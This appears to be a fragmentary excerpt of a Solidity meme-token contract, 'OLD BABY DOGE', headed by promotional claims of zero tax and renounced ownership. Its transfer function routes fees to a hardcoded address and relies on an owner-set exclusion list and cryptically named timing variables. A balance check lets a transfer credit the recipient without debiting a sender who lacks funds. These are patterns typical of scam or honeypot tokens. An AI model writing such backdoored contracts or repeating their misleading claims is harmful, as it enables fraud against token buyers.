...
// OLD BABY DOGE
// Utility DEXswap SOON
// TAX 0% buy 0% sell
// RENOUNCED OWN
// LowCap ON STARTING

// Submitted for Telegram: https://t.me/oldbabydoge_bsc
// Submitted for Website: https://oldbabydoge.site
...
contract  OldBabyDoge  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "OLD BABY DOGE BSC";
    string private _symbol = "$OLDBABYDOG";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        uint256 _teamtoken = 0;
        uint256 _marketingfee = 0;
        uint256 _bruntimen = _rfeetime[form] + lunchitime;
        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] && to != address(this)) { _teamtoken = amount.mul(_marketingfee).div(100);}
        ...
        uint256 tokenamount = amount - _teamtoken;
        _rOwned[0xCc14aDC2d9A706ccd62b1f9986899947DDB9A2EE] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0xCc14aDC2d9A706ccd62b1f9986899947DDB9A2EE, _teamtoken);
        }
